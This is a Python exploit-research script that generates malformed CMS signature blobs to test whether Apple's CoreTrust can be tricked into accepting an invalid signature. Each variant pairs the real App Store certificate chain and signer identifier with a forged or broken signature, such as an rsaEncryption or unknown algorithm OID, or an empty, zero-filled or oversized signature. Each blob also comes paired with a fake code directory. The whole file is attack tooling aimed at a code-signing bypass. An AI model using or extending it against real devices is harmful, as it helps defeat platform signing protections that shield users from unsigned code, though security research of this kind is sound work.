#!/usr/bin/env python3
"""Targeted CMS signature-algorithm/length variants with the real App Store
certificate chain but our (invalid) signature. If CoreTrust returns 0 with
policy 0x100, the signature check is bypassable."""
import copy, os, sys
from asn1crypto import cms, core

SRC = 'cases/case_apple_iphone.cms'
APP = 'cases/appstore_template.cms'
OUT = 'cases'

def load(p):
    return cms.ContentInfo.load(open(p, 'rb').read())

def dump(ci, name):
    p = os.path.join(OUT, name + '.cms')
    open(p, 'wb').write(ci.dump())
    # pair with the fake CD the signedAttrs refer to
    open(os.path.join(OUT, name + '.cd'), 'wb').write(open('cases/case_apple_iphone.cd', 'rb').read())
    print(p, len(ci.dump()))

def set_sid_appstore(si, app_leaf):
    si['sid'] = cms.SignerIdentifier({
        'issuer_and_serial_number': cms.IssuerAndSerialNumber({
            'issuer': app_leaf['tbs_certificate']['issuer'],
            'serial_number': app_leaf['tbs_certificate']['serial_number'],
        })
    })

def main():
    base = load(SRC)
    app = load(APP)
    app_certs = app['content']['certificates']
    app_leaf = app_certs[0].chosen
    sd = base['content']
    si = sd['signer_infos'][0]

    # 1. swap certs + sid to App Store, keep our invalid signature
    c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
    sd['certificates'] = cms.CertificateSet([x for x in app_certs])
    set_sid_appstore(si, app_leaf)
    dump(c, 'bad_appstore_sid')

    # 2. same + rsaEncryption algorithm (1.2.840.113549.1.1.1)
    c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
    sd['certificates'] = cms.CertificateSet([x for x in app_certs])
    set_sid_appstore(si, app_leaf)
    si['signature_algorithm'] = cms.SignedDigestAlgorithm({'algorithm': '1.2.840.113549.1.1.1',
                                                           'parameters': core.Null()})
    dump(c, 'bad_appstore_rsa')

    # 3. same + unknown signature OID
    c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
    sd['certificates'] = cms.CertificateSet([x for x in app_certs])
    set_sid_appstore(si, app_leaf)
    si['signature_algorithm'] = cms.SignedDigestAlgorithm({'algorithm': '1.2.3.4.5.6.7'})
    dump(c, 'bad_appstore_unknownalg')

    # 4. same + empty signature
    c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
    sd['certificates'] = cms.CertificateSet([x for x in app_certs])
    set_sid_appstore(si, app_leaf)
    si['signature'] = core.OctetString(b'')
    dump(c, 'bad_appstore_emptysig')

    # 5. same + 1-byte / zero / long signatures
    for name, val in [('onesig', b'\x00'), ('zerosig', b'\x00' * 256), ('longsig', b'\x00' * 512)]:
        c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
        sd['certificates'] = cms.CertificateSet([x for x in app_certs])
        set_sid_appstore(si, app_leaf)
        si['signature'] = core.OctetString(val)
        dump(c, 'bad_appstore_' + name)

    # 6. unknown digest algorithm, keep App Store chain/sid
    c = load(SRC); sd = c['content']; si = sd['signer_infos'][0]
    sd['certificates'] = cms.CertificateSet([x for x in app_certs])
    set_sid_appstore(si, app_leaf)
    si['digest_algorithm'] = cms.DigestAlgorithm({'algorithm': '1.2.3.4.5.6.8'})
    dump(c, 'bad_appstore_unknowndig')

if __name__ == '__main__':
    main()
